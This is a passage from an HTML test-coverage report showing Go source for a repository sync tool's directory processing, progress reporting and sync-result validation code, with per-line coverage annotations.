                        filepath.Join(dirMapping.Src, file.RelativePath),
                        destPath,
                        dirMapping.Transform,
                        &amp;dirMapping, // Pass reference to directory mapping
                        file.RelativePath,
                        fileIndex,
                        totalFiles,
                )

                jobs = append(jobs, job)
                fileIndex++</span>
        }

        <span class="cov8" title="1">dp.logger.WithFields(logrus.Fields{
                "source_directory": dirMapping.Src,
                "jobs_created":     len(jobs),
                "total_files":      totalFiles,
        }).Debug("Directory file jobs created with enhanced metadata")

        return jobs</span>
}

// calculateDestinationPath determines the destination path for a file
func (dp *DirectoryProcessor) calculateDestinationPath(relativePath string, dirMapping config.DirectoryMapping) string <span class="cov8" title="1">{
        // Check if structure should be preserved
        preserveStructure := true
        if dirMapping.PreserveStructure != nil </span><span class="cov8" title="1">{
                preserveStructure = *dirMapping.PreserveStructure
        }</span>

        <span class="cov8" title="1">if preserveStructure </span><span class="cov8" title="1">{
                // Preserve directory structure
                return filepath.Join(dirMapping.Dest, relativePath)
        }</span>

        // Flatten structure - put all files directly in destination directory
        <span class="cov8" title="1">filename := filepath.Base(relativePath)
        return filepath.Join(dirMapping.Dest, filename)</span>
}

// isHidden checks if a path represents a hidden file or directory
func (dp *DirectoryProcessor) isHidden(path string) bool <span class="cov8" title="1">{
        // Split path into components and check each one
        parts := strings.Split(filepath.ToSlash(path), "/")
        for _, part := range parts </span><span class="cov8" title="1">{
                if strings.HasPrefix(part, ".") &amp;&amp; part != "." &amp;&amp; part != ".." </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}

// ValidateDirectoryMapping validates a directory mapping configuration
func ValidateDirectoryMapping(dirMapping config.DirectoryMapping) error <span class="cov8" title="1">{
        if dirMapping.Src == "" </span><span class="cov8" title="1">{
                return ErrSourceDirectoryEmpty
        }</span>

        <span class="cov8" title="1">if dirMapping.Dest == "" </span><span class="cov8" title="1">{
                return ErrDestinationDirectoryEmpty
        }</span>

        // Validate exclusion patterns
        <span class="cov8" title="1">for _, pattern := range dirMapping.Exclude </span><span class="cov8" title="1">{
                if pattern == "" </span><span class="cov8" title="1">{
                        return ErrEmptyExclusionPattern
                }</span>
        }

        <span class="cov8" title="1">return nil</span>
}

// GetDirectoryStats returns statistics about directory processing
func (dp *DirectoryProcessor) GetDirectoryStats() map[string]DirectoryMetrics <span class="cov0" title="0">{
        return dp.progressManager.GetAllMetrics()
}</span>

// CompleteAllDirectories completes all active directory processing and returns final metrics
func (dp *DirectoryProcessor) CompleteAllDirectories() map[string]DirectoryMetrics <span class="cov0" title="0">{
        return dp.progressManager.CompleteAll()
}</span>

// SetWorkerCount updates the worker count for the processor
func (dp *DirectoryProcessor) SetWorkerCount(count int) <span class="cov0" title="0">{
        if count &gt; 0 </span><span class="cov0" title="0">{
                dp.workerCount = count
        }</span>
}

// GetWorkerCount returns the current worker count
func (dp *DirectoryProcessor) GetWorkerCount() int <span class="cov0" title="0">{
        return dp.workerCount
}</span>

// handleModuleSync handles module-aware synchronization for a directory
func (dp *DirectoryProcessor) handleModuleSync(ctx context.Context, sourceDir string, moduleConfig *config.ModuleConfig, logger *logrus.Entry) error <span class="cov0" title="0">{
        // Currently only support Go modules
        if moduleConfig.Type != "" &amp;&amp; moduleConfig.Type != "go" </span><span class="cov0" title="0">{
                return fmt.Errorf("%w: %s", ErrUnsupportedModuleType, moduleConfig.Type)
        }</span>

        // Check if the directory contains a Go module
        <span class="cov0" title="0">moduleInfo, err := dp.moduleDetector.DetectModule(sourceDir)
        if err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to detect module: %w", err)
        }</span>

        <span class="cov0" title="0">if moduleInfo == nil </span><span class="cov0" title="0">{
                logger.Debug("Directory does not contain a Go module, skipping module handling")
                return nil
        }</span>

        <span class="cov0" title="0">logger.WithFields(logrus.Fields{
                "module_name":    moduleInfo.Name,
                "module_path":    moduleInfo.Path,
                "version_config": moduleConfig.Version,
                "check_tags":     moduleConfig.CheckTags,
        }).Info("Detected Go module for version-aware sync")

        // If version constraint is specified, resolve it
        if moduleConfig.Version != "" </span><span class="cov0" title="0">{
                // Determine if we should check git tags
                checkTags := true
                if moduleConfig.CheckTags != nil </span><span class="cov0" title="0">{
                        checkTags = *moduleConfig.CheckTags
                }</span>

                // Get the repository path from the module name (assuming GitHub for now)
                // This is a simplified implementation - in reality, we'd need to parse the module name
                // more carefully and handle various repository hosting services
                <span class="cov0" title="0">repoPath := moduleInfo.Name
                repoPath = strings.TrimPrefix(repoPath, "github.com/")

                resolvedVersion, err := dp.moduleResolver.ResolveVersion(
                        ctx,
                        fmt.Sprintf("https://github.com/%s", repoPath),
                        moduleConfig.Version,
                        checkTags,
                )
                if err != nil </span><span class="cov0" title="0">{
                        logger.WithError(err).Warn("Failed to resolve module version constraint")
                        // Continue without version resolution
                        return nil
                }</span>

                <span class="cov0" title="0">logger.WithFields(logrus.Fields{
                        "constraint": moduleConfig.Version,
                        "resolved":   resolvedVersion,
                }).Info("Resolved module version")

                // Store the resolved version for potential use in file processing
                // This could be used to update go.mod files if UpdateRefs is true
                moduleInfo.Version = resolvedVersion</span>
        }

        // If UpdateRefs is true, we'll need to update go.mod references
        // This would be handled during file processing
        <span class="cov0" title="0">if moduleConfig.UpdateRefs </span><span class="cov0" title="0">{
                logger.Debug("Module reference updates will be applied during file processing")
        }</span>

        <span class="cov0" title="0">return nil</span>
}

// ProcessDirectoriesWithMetrics processes directories and returns detailed metrics
func (rs *RepositorySync) ProcessDirectoriesWithMetrics(ctx context.Context) ([]FileChange, map[string]DirectoryMetrics, error) <span class="cov0" title="0">{
        changes, err := rs.processDirectories(ctx)
        if err != nil </span><span class="cov0" title="0">{
                return nil, nil, err
        }</span>

        // Get metrics from the processor if available
        // Metrics collection requires tracking the processor instance
        <span class="cov0" title="0">m := make(map[string]DirectoryMetrics)

        return changes, m, nil</span>
}

// DirectoryProcessingOptions configures directory processing behavior
type DirectoryProcessingOptions struct {
        WorkerCount            int                               // Number of concurrent workers
        ProgressThreshold      int                               // Minimum files for progress reporting
        ExclusionPatterns      []string                          // Additional exclusion patterns
        IncludeHidden          *bool                             // Override hidden file inclusion
        PreserveStructure      *bool                             // Override structure preservation
        CustomProgressReporter *DirectoryProgressReporterOptions // Custom progress reporting options
}

// ProcessDirectoriesWithOptions processes directories with custom options
func (rs *RepositorySync) ProcessDirectoriesWithOptions(ctx context.Context, opts DirectoryProcessingOptions) ([]FileChange, error) <span class="cov0" title="0">{
        if len(rs.target.Directories) == 0 </span><span class="cov0" title="0">{
                rs.logger.Debug("No directories configured for sync")
                return nil, nil
        }</span>

        // Apply worker count
        <span class="cov0" title="0">workerCount := opts.WorkerCount
        if workerCount &lt;= 0 </span><span class="cov0" title="0">{
                workerCount = 10
        }</span>

        <span class="cov0" title="0">processTimer := metrics.StartTimer(ctx, rs.logger, "directory_processing_with_options").
                AddField("directory_count", len(rs.target.Directories)).
                AddField("worker_count", workerCount).
                AddField("progress_threshold", opts.ProgressThreshold)

        rs.logger.WithFields(logrus.Fields{
                "directory_count":    len(rs.target.Directories),
                "worker_count":       workerCount,
                "progress_threshold": opts.ProgressThreshold,
        }).Info("Processing directories with custom options")

        // Create directory processor with custom options
        processor := NewDirectoryProcessor(rs.logger, workerCount)
        defer processor.Close()

        sourcePath := filepath.Join(rs.tempDir, "source")
        var allChanges []FileChange

        // Process each directory mapping with options
        for _, dirMapping := range rs.target.Directories </span><span class="cov0" title="0">{
                // Apply option overrides to directory mapping
                modifiedMapping := dirMapping

                // Override hidden file inclusion if specified
                if opts.IncludeHidden != nil </span><span class="cov0" title="0">{
                        modifiedMapping.IncludeHidden = opts.IncludeHidden
                }</span>

                // Override structure preservation if specified
                <span class="cov0" title="0">if opts.PreserveStructure != nil </span><span class="cov0" title="0">{
                        modifiedMapping.PreserveStructure = opts.PreserveStructure
                }</span>

                // Add additional exclusion patterns
                <span class="cov0" title="0">if len(opts.ExclusionPatterns) &gt; 0 </span><span class="cov0" title="0">{
                        modifiedMapping.Exclude = append(modifiedMapping.Exclude, opts.ExclusionPatterns...)
                }</span>

                <span class="cov0" title="0">changes, err := processor.ProcessDirectoryMapping(ctx, sourcePath, modifiedMapping, rs.target, rs.sourceState, rs.engine)
                if err != nil </span><span class="cov0" title="0">{
                        // Log error but continue processing other directories
                        rs.logger.WithError(err).WithField("directory", dirMapping.Src).Error("Failed to process directory with options")
                        continue</span>
                }
                <span class="cov0" title="0">allChanges = append(allChanges, changes...)</span>
        }

        <span class="cov0" title="0">processTimer.AddField("total_changes", len(allChanges)).Stop()

        rs.logger.WithField("total_changes", len(allChanges)).Info("Directory processing with options completed")
        return allChanges, nil</span>
}
</pre>

		<pre class="file" id="file59" style="display: none">package sync

import (
        "sync"
        "time"

        "github.com/sirupsen/logrus"
)

// DirectoryProgressReporter handles progress reporting for directory operations
type DirectoryProgressReporter struct {
        logger         *logrus.Entry
        threshold      int           // Minimum files to trigger progress reporting
        updateInterval time.Duration // Minimum time between progress updates
        lastUpdate     time.Time
        mu             sync.RWMutex
        enabled        bool
        directoryPath  string
        metrics        DirectoryMetrics
}

// DirectoryMetrics tracks meaningful metrics for directory processing
type DirectoryMetrics struct {
        FilesDiscovered   int
        FilesProcessed    int
        FilesExcluded     int
        FilesSkipped      int
        FilesErrored      int
        DirectoriesWalked int
        TotalSize         int64
        ProcessedSize     int64
        StartTime         time.Time
        EndTime           time.Time

        // Binary file metrics
        BinaryFilesSkipped     int
        BinaryFilesSize        int64
        TransformErrors        int
        TransformSuccesses     int
        TotalTransformDuration time.Duration
        TransformCount         int // Track number of transforms for averaging
}

// NewDirectoryProgressReporter creates a new directory progress reporter
func NewDirectoryProgressReporter(logger *logrus.Entry, directoryPath string, threshold int) *DirectoryProgressReporter <span class="cov8" title="1">{
        if threshold &lt;= 0 </span><span class="cov8" title="1">{
                threshold = 50 // Default threshold for progress reporting
        }</span>

        <span class="cov8" title="1">return &amp;DirectoryProgressReporter{
                logger:         logger,
                threshold:      threshold,
                updateInterval: 2 * time.Second, // Update every 2 seconds at most
                directoryPath:  directoryPath,
                metrics: DirectoryMetrics{
                        StartTime: time.Now(),
                },
        }</span>
}

// Start initializes progress reporting if the file count exceeds threshold
func (dpr *DirectoryProgressReporter) Start(totalFiles int) <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()

        dpr.enabled = totalFiles &gt;= dpr.threshold
        dpr.metrics.FilesDiscovered = totalFiles

        if dpr.enabled </span><span class="cov8" title="1">{
                dpr.logger.WithFields(logrus.Fields{
                        "directory":   dpr.directoryPath,
                        "total_files": totalFiles,
                        "threshold":   dpr.threshold,
                }).Info("Directory processing started - progress reporting enabled")
        }</span> else<span class="cov8" title="1"> {
                dpr.logger.WithFields(logrus.Fields{
                        "directory":   dpr.directoryPath,
                        "total_files": totalFiles,
                        "threshold":   dpr.threshold,
                }).Debug("Directory processing started - progress reporting disabled (below threshold)")
        }</span>
}

// UpdateProgress updates the current progress with non-blocking behavior
func (dpr *DirectoryProgressReporter) UpdateProgress(current, total int, message string) <span class="cov8" title="1">{
        if !dpr.isEnabled() </span><span class="cov8" title="1">{
                return
        }</span>

        <span class="cov8" title="1">dpr.mu.Lock()
        defer dpr.mu.Unlock()

        now := time.Now()
        // Rate limit updates to avoid spam
        if now.Sub(dpr.lastUpdate) &lt; dpr.updateInterval </span><span class="cov8" title="1">{
                return
        }</span>

        <span class="cov8" title="1">dpr.lastUpdate = now
        percentage := float64(current) / float64(total) * 100

        dpr.logger.WithFields(logrus.Fields{
                "directory":      dpr.directoryPath,
                "progress":       current,
                "total":          total,
                "percentage":     percentage,
                "message":        message,
                "files_excluded": dpr.metrics.FilesExcluded,
                "files_errored":  dpr.metrics.FilesErrored,
        }).Info("Directory processing progress")</span>
}

// RecordFileDiscovered increments the files discovered counter
func (dpr *DirectoryProgressReporter) RecordFileDiscovered() <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()
        dpr.metrics.FilesDiscovered++
}</span>

// RecordFileProcessed increments the files processed counter
func (dpr *DirectoryProgressReporter) RecordFileProcessed(size int64) <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()
        dpr.metrics.FilesProcessed++
        dpr.metrics.ProcessedSize += size
}</span>

// RecordFileExcluded increments the files excluded counter
func (dpr *DirectoryProgressReporter) RecordFileExcluded() <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()
        dpr.metrics.FilesExcluded++
}</span>

// RecordFileSkipped increments the files skipped counter
func (dpr *DirectoryProgressReporter) RecordFileSkipped() <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()
        dpr.metrics.FilesSkipped++
}</span>

// RecordFileError increments the files errored counter
func (dpr *DirectoryProgressReporter) RecordFileError() <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()
        dpr.metrics.FilesErrored++
}</span>

// RecordDirectoryWalked increments the directories walked counter
func (dpr *DirectoryProgressReporter) RecordDirectoryWalked() <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()
        dpr.metrics.DirectoriesWalked++
}</span>

// AddTotalSize adds to the total size counter
func (dpr *DirectoryProgressReporter) AddTotalSize(size int64) <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()
        dpr.metrics.TotalSize += size
}</span>

// Complete marks the directory processing as complete and reports final metrics
func (dpr *DirectoryProgressReporter) Complete() DirectoryMetrics <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()

        dpr.metrics.EndTime = time.Now()
        duration := dpr.metrics.EndTime.Sub(dpr.metrics.StartTime)

        // Calculate average transform duration
        var avgTransformDuration time.Duration
        if dpr.metrics.TransformCount &gt; 0 </span><span class="cov8" title="1">{
                avgTransformDuration = dpr.metrics.TotalTransformDuration / time.Duration(dpr.metrics.TransformCount)
        }</span>

        <span class="cov8" title="1">fields := logrus.Fields{
                "directory":                   dpr.directoryPath,
                "files_discovered":            dpr.metrics.FilesDiscovered,
                "files_processed":             dpr.metrics.FilesProcessed,
                "files_excluded":              dpr.metrics.FilesExcluded,
                "files_skipped":               dpr.metrics.FilesSkipped,
                "files_errored":               dpr.metrics.FilesErrored,
                "directories_walked":          dpr.metrics.DirectoriesWalked,
                "total_size_bytes":            dpr.metrics.TotalSize,
                "processed_size_bytes":        dpr.metrics.ProcessedSize,
                "binary_files_skipped":        dpr.metrics.BinaryFilesSkipped,
                "binary_files_size_bytes":     dpr.metrics.BinaryFilesSize,
                "transform_errors":            dpr.metrics.TransformErrors,
                "transform_successes":         dpr.metrics.TransformSuccesses,
                "avg_transform_duration_ms":   avgTransformDuration.Milliseconds(),
                "total_transform_duration_ms": dpr.metrics.TotalTransformDuration.Milliseconds(),
                "duration":                    duration,
        }

        if dpr.enabled </span><span class="cov8" title="1">{
                dpr.logger.WithFields(fields).Info("Directory processing completed")
        }</span> else<span class="cov8" title="1"> {
                dpr.logger.WithFields(fields).Debug("Directory processing completed")
        }</span>

        <span class="cov8" title="1">return dpr.metrics</span>
}

// isEnabled checks if progress reporting is enabled
func (dpr *DirectoryProgressReporter) isEnabled() bool <span class="cov8" title="1">{
        dpr.mu.RLock()
        defer dpr.mu.RUnlock()
        return dpr.enabled
}</span>

// GetMetrics returns the current metrics (thread-safe)
func (dpr *DirectoryProgressReporter) GetMetrics() DirectoryMetrics <span class="cov8" title="1">{
        dpr.mu.RLock()
        defer dpr.mu.RUnlock()
        return dpr.metrics
}</span>

// SetThreshold updates the threshold for progress reporting
func (dpr *DirectoryProgressReporter) SetThreshold(threshold int) <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()
        dpr.threshold = threshold
}</span>

// SetUpdateInterval updates the minimum interval between progress updates
func (dpr *DirectoryProgressReporter) SetUpdateInterval(interval time.Duration) <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()
        dpr.updateInterval = interval
}</span>

// RecordBinaryFileSkipped records that a binary file was skipped with its size
func (dpr *DirectoryProgressReporter) RecordBinaryFileSkipped(size int64) <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()
        dpr.metrics.BinaryFilesSkipped++
        dpr.metrics.BinaryFilesSize += size
}</span>

// RecordTransformError records a transformation error
func (dpr *DirectoryProgressReporter) RecordTransformError() <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()
        dpr.metrics.TransformErrors++
}</span>

// RecordTransformSuccess records a successful transformation with its duration
func (dpr *DirectoryProgressReporter) RecordTransformSuccess(duration time.Duration) <span class="cov8" title="1">{
        dpr.mu.Lock()
        defer dpr.mu.Unlock()
        dpr.metrics.TransformSuccesses++
        dpr.metrics.TotalTransformDuration += duration
        dpr.metrics.TransformCount++
}</span>

// GetAverageTransformDuration returns the average transform duration
func (dpr *DirectoryProgressReporter) GetAverageTransformDuration() time.Duration <span class="cov8" title="1">{
        dpr.mu.RLock()
        defer dpr.mu.RUnlock()
        if dpr.metrics.TransformCount == 0 </span><span class="cov8" title="1">{
                return 0
        }</span>
        <span class="cov8" title="1">return dpr.metrics.TotalTransformDuration / time.Duration(dpr.metrics.TransformCount)</span>
}

// IsProgressReportingNeeded determines if progress reporting should be enabled
func IsProgressReportingNeeded(fileCount, threshold int) bool <span class="cov8" title="1">{
        if threshold &lt;= 0 </span><span class="cov8" title="1">{
                threshold = 50
        }</span>
        <span class="cov8" title="1">return fileCount &gt;= threshold</span>
}

// DirectoryProgressReporterOptions configures directory progress reporting
type DirectoryProgressReporterOptions struct {
        Threshold      int           // Minimum files to trigger progress reporting
        UpdateInterval time.Duration // Minimum time between updates
        Enabled        bool          // Force enable/disable reporting
}

// NewDirectoryProgressReporterWithOptions creates a progress reporter with custom options
func NewDirectoryProgressReporterWithOptions(logger *logrus.Entry, directoryPath string, opts DirectoryProgressReporterOptions) *DirectoryProgressReporter <span class="cov8" title="1">{
        reporter := NewDirectoryProgressReporter(logger, directoryPath, opts.Threshold)

        if opts.UpdateInterval &gt; 0 </span><span class="cov8" title="1">{
                reporter.SetUpdateInterval(opts.UpdateInterval)
        }</span>

        <span class="cov8" title="1">if opts.Enabled </span><span class="cov8" title="1">{
                reporter.mu.Lock()
                reporter.enabled = true
                reporter.mu.Unlock()
        }</span>

        <span class="cov8" title="1">return reporter</span>
}

// BatchProgressWrapper wraps the DirectoryProgressReporter to implement ProgressReporter interface
type BatchProgressWrapper struct {
        reporter *DirectoryProgressReporter
}

// NewBatchProgressWrapper creates a wrapper for batch processing progress reporting
func NewBatchProgressWrapper(reporter *DirectoryProgressReporter) *BatchProgressWrapper <span class="cov8" title="1">{
        return &amp;BatchProgressWrapper{
                reporter: reporter,
        }
}</span>

// UpdateProgress implements ProgressReporter interface for batch processing
func (bpw *BatchProgressWrapper) UpdateProgress(current, total int, message string) <span class="cov8" title="1">{
        if bpw.reporter != nil </span><span class="cov8" title="1">{
                bpw.reporter.UpdateProgress(current, total, message)
        }</span>
}

// RecordBinaryFileSkipped implements EnhancedProgressReporter interface
func (bpw *BatchProgressWrapper) RecordBinaryFileSkipped(size int64) <span class="cov8" title="1">{
        if bpw.reporter != nil </span><span class="cov8" title="1">{
                bpw.reporter.RecordBinaryFileSkipped(size)
        }</span>
}

// RecordTransformError implements EnhancedProgressReporter interface
func (bpw *BatchProgressWrapper) RecordTransformError() <span class="cov8" title="1">{
        if bpw.reporter != nil </span><span class="cov8" title="1">{
                bpw.reporter.RecordTransformError()
        }</span>
}

// RecordTransformSuccess implements EnhancedProgressReporter interface
func (bpw *BatchProgressWrapper) RecordTransformSuccess(duration time.Duration) <span class="cov8" title="1">{
        if bpw.reporter != nil </span><span class="cov8" title="1">{
                bpw.reporter.RecordTransformSuccess(duration)
        }</span>
}

// DirectoryProgressManager manages multiple directory progress reporters
type DirectoryProgressManager struct {
        reporters map[string]*DirectoryProgressReporter
        mu        sync.RWMutex
        logger    *logrus.Entry
}

// NewDirectoryProgressManager creates a new progress manager
func NewDirectoryProgressManager(logger *logrus.Entry) *DirectoryProgressManager <span class="cov8" title="1">{
        return &amp;DirectoryProgressManager{
                reporters: make(map[string]*DirectoryProgressReporter),
                logger:    logger,
        }
}</span>

// GetReporter gets or creates a progress reporter for a directory
func (dpm *DirectoryProgressManager) GetReporter(directoryPath string, threshold int) *DirectoryProgressReporter <span class="cov8" title="1">{
        dpm.mu.Lock()
        defer dpm.mu.Unlock()

        if reporter, exists := dpm.reporters[directoryPath]; exists </span><span class="cov8" title="1">{
                return reporter
        }</span>

        <span class="cov8" title="1">reporter := NewDirectoryProgressReporter(dpm.logger, directoryPath, threshold)
        dpm.reporters[directoryPath] = reporter
        return reporter</span>
}

// CompleteAll completes all active reporters and returns their metrics
func (dpm *DirectoryProgressManager) CompleteAll() map[string]DirectoryMetrics <span class="cov8" title="1">{
        dpm.mu.Lock()
        defer dpm.mu.Unlock()

        results := make(map[string]DirectoryMetrics)
        for path, reporter := range dpm.reporters </span><span class="cov8" title="1">{
                results[path] = reporter.Complete()
        }</span>

        // Clear reporters after completion
        <span class="cov8" title="1">dpm.reporters = make(map[string]*DirectoryProgressReporter)
        return results</span>
}

// GetAllMetrics returns current metrics for all reporters
func (dpm *DirectoryProgressManager) GetAllMetrics() map[string]DirectoryMetrics <span class="cov8" title="1">{
        dpm.mu.RLock()
        defer dpm.mu.RUnlock()

        results := make(map[string]DirectoryMetrics)
        for path, reporter := range dpm.reporters </span><span class="cov8" title="1">{
                results[path] = reporter.GetMetrics()
        }</span>
        <span class="cov8" title="1">return results</span>
}
</pre>

		<pre class="file" id="file60" style="display: none">package sync

import (
        "context"
        "crypto/sha256"
        "errors"
        "fmt"
        "io"
        "io/fs"
        "os"
        "path/filepath"
        "runtime"
        "strings"
        "sync"
        "time"
        "unicode/utf8"

        "github.com/sirupsen/logrus"

        "github.com/mrz1836/go-broadcast/internal/config"
)

// Static error variables
var (
        ErrValidationFailed          = errors.New("validation failed")
        ErrTransformValidationFailed = errors.New("transform validation failed")
        ErrEncodingValidationFailed  = errors.New("encoding validation failed")
)

// ValidationResult represents the outcome of a validation operation
type ValidationResult struct {
        Valid   bool              `json:"valid"`
        Errors  []string          `json:"errors,omitempty"`
        Summary ValidationSummary `json:"summary"`
}

// ValidationSummary provides statistics about the validation run
type ValidationSummary struct {
        TotalFiles        int           `json:"total_files"`
        ValidFiles        int           `json:"valid_files"`
        InvalidFiles      int           `json:"invalid_files"`
        MissingFiles      int           `json:"missing_files"`
        ExtraFiles        int           `json:"extra_files"`
        ContentMismatches int           `json:"content_mismatches"`
        TransformErrors   int           `json:"transform_errors"`
        StructureErrors   int           `json:"structure_errors"`
        ExclusionErrors   int           `json:"exclusion_errors"`
        Duration          time.Duration `json:"duration"`
        BytesValidated    int64         `json:"bytes_validated"`
}

// FileValidationError contains detailed information about a file validation failure
type FileValidationError struct {
        FilePath    string   `json:"file_path"`
        ErrorType   string   `json:"error_type"`
        Expected    string   `json:"expected,omitempty"`
        Actual      string   `json:"actual,omitempty"`
        Details     string   `json:"details,omitempty"`
        Suggestions []string `json:"suggestions,omitempty"`
}

// PerformanceValidationResult tracks performance metrics validation
type PerformanceValidationResult struct {
        Valid                 bool                         `json:"valid"`
        APICallsOptimized     bool                         `json:"api_calls_optimized"`
        CacheHitRateGood      bool                         `json:"cache_hit_rate_good"`
        MemoryUsageAcceptable bool                         `json:"memory_usage_acceptable"`
        ProcessingTimeGood    bool                         `json:"processing_time_good"`
        Metrics               ValidationPerformanceMetrics `json:"metrics"`
        Thresholds            PerformanceThresholds        `json:"thresholds"`
        Recommendations       []string                     `json:"recommendations,omitempty"`
}

// ValidationPerformanceMetrics contains actual performance measurements
type ValidationPerformanceMetrics struct {
        APICalls       int           `json:"api_calls"`
        CacheHits      int           `json:"cache_hits"`
        CacheMisses    int           `json:"cache_misses"`
        CacheHitRate   float64       `json:"cache_hit_rate"`
        MemoryUsage    int64         `json:"memory_usage_bytes"`
        ProcessingTime time.Duration `json:"processing_time"`
        FilesProcessed int           `json:"files_processed"`
        ThroughputMBps float64       `json:"throughput_mbps"`
}

// PerformanceThresholds defines acceptable performance limits
type PerformanceThresholds struct {
        MaxAPICalls       int           `json:"max_api_calls"`
        MinCacheHitRate   float64       `json:"min_cache_hit_rate"`
        MaxMemoryMB       int64         `json:"max_memory_mb"`
        MaxProcessingTime time.Duration `json:"max_processing_time"`
        MinThroughputMBps float64       `json:"min_throughput_mbps"`
}

// DirectoryValidator provides utilities for validating directory sync results
type DirectoryValidator struct {
        logger                *logrus.Entry
        exclusionEngine       *ExclusionEngine
        performanceThresholds PerformanceThresholds
        mu                    sync.RWMutex
}

// integrityJob represents a file integrity validation job
type integrityJob struct {
        sourcePath    string
        sourceContent string
        destContent   string
        exists        bool
}

// ValidationOptions configures validation behavior
type ValidationOptions struct {
        CheckContent           bool                   `json:"check_content"`
        CheckStructure         bool                   `json:"check_structure"`
        CheckExclusions        bool                   `json:"check_exclusions"`
        CheckTransforms        bool                   `json:"check_transforms"`
        CheckPerformance       bool                   `json:"check_performance"`
        CheckIntegrity         bool                   `json:"check_integrity"`
        PerformanceThresholds  *PerformanceThresholds `json:"performance_thresholds,omitempty"`
        IgnoreHiddenFiles      bool                   `json:"ignore_hidden_files"`
        MaxConcurrency         int                    `json:"max_concurrency"`
        DetailedErrorReporting bool                   `json:"detailed_error_reporting"`
}

// NewDirectoryValidator creates a new directory validator
func NewDirectoryValidator(logger *logrus.Entry) *DirectoryValidator <span class="cov8" title="1">{
        return &amp;DirectoryValidator{
                logger: logger,
                performanceThresholds: PerformanceThresholds{
                        MaxAPICalls:       1000,
                        MinCacheHitRate:   0.8,
                        MaxMemoryMB:       500,
                        MaxProcessingTime: 10 * time.Minute,
                        MinThroughputMBps: 1.0,
                },
        }
}</span>

// SetPerformanceThresholds updates the performance validation thresholds
func (dv *DirectoryValidator) SetPerformanceThresholds(thresholds PerformanceThresholds) <span class="cov8" title="1">{
        dv.mu.Lock()
        defer dv.mu.Unlock()
        dv.performanceThresholds = thresholds
}</span>

// ValidateSyncResults compares source and destination directories to ensure sync was successful
func (dv *DirectoryValidator) ValidateSyncResults(ctx context.Context, sourceDir, destDir string, dirMapping config.DirectoryMapping, opts ValidationOptions) (*ValidationResult, error) <span class="cov8" title="1">{
        startTime := time.Now()

        logger := dv.logger.WithFields(logrus.Fields{
                "source_dir": sourceDir,
                "dest_dir":   destDir,
                "operation":  "validate_sync_results",
        })

        logger.Info("Starting sync results validation")

        result := &amp;ValidationResult{
                Valid:   true,
                Errors:  []string{},
                Summary: ValidationSummary{},
        }

        // Set up exclusion engine for this directory mapping
        dv.exclusionEngine = NewExclusionEngineWithIncludes(dirMapping.Exclude, dirMapping.IncludeOnly)

        // Validate that source directory exists
        if _, err := os.Stat(sourceDir); os.IsNotExist(err) </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("source directory validation failed: %w", err)
        }</span>

        // Validate that destination directory exists
        <span class="cov8" title="1">if _, err := os.Stat(destDir); os.IsNotExist(err) </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("destination directory validation failed: %w", err)
        }</span>

        // Discover files in both directories
        <span class="cov8" title="1">sourceFiles, err := dv.discoverFiles(ctx, sourceDir, dirMapping, opts)
        if err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to discover source files: %w", err)
        }</span>

        <span class="cov8" title="1">destFiles, err := dv.discoverFiles(ctx, destDir, dirMapping, opts)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to discover destination files: %w", err)
        }</span>

        <span class="cov8" title="1">result.Summary.TotalFiles = len(sourceFiles)

        // Validate file mappings
        if opts.CheckStructure </span><span class="cov8" title="1">{
                dv.validateDirectoryStructure(sourceFiles, destFiles, dirMapping, result, logger)
        }</span>

        // Validate file content
        <span class="cov8" title="1">if opts.CheckContent </span><span class="cov8" title="1">{
                dv.validateFileContent(ctx, sourceDir, destDir, sourceFiles, destFiles, dirMapping, result, opts, logger)
        }</span>

        // Validate exclusions
        <span class="cov8" title="1">if opts.CheckExclusions </span><span class="cov8" title="1">{
                dv.validateExclusions(sourceFiles, destFiles, dirMapping, result, logger)
        }</span>

        // Complete validation summary
        <span class="cov8" title="1">result.Summary.Duration = time.Since(startTime)
        result.Summary.ValidFiles = result.Summary.TotalFiles - result.Summary.InvalidFiles

        if len(result.Errors) &gt; 0 </span><span class="cov8" title="1">{
                result.Valid = false
        }</span>

        <span class="cov8" title="1">logger.WithFields(logrus.Fields{
                "valid":         result.Valid,
                "total_files":   result.Summary.TotalFiles,
                "invalid_files": result.Summary.InvalidFiles,
                "duration_ms":   result.Summary.Duration.Milliseconds(),
        }).Info("Sync results validation completed")

        return result, nil</span>
}

// ValidateTransformApplication verifies that transforms were applied correctly to directory files
func (dv *DirectoryValidator) ValidateTransformApplication(_ context.Context, originalFiles, transformedFiles map[string]string, transform config.Transform, _ ValidationOptions) (*ValidationResult, error) <span class="cov8" title="1">{
        startTime := time.Now()

        logger := dv.logger.WithFields(logrus.Fields{
                "operation":         "validate_transform_application",
                "original_count":    len(originalFiles),
                "transformed_count": len(transformedFiles),
        })

        logger.Info("Starting transform application validation")

        result := &amp;ValidationResult{
                Valid:  true,
                Errors: []string{},
                Summary: ValidationSummary{
                        TotalFiles: len(originalFiles),
                },
        }

        // Check that all original files have corresponding transformed files
        for originalPath, originalContent := range originalFiles </span><span class="cov8" title="1">{
                transformedContent, exists := transformedFiles[originalPath]
                if !exists </span><span class="cov8" title="1">{
                        result.Errors = append(result.Errors, fmt.Sprintf("missing transformed file: %s", originalPath))
                        result.Summary.MissingFiles++
                        continue</span>
                }

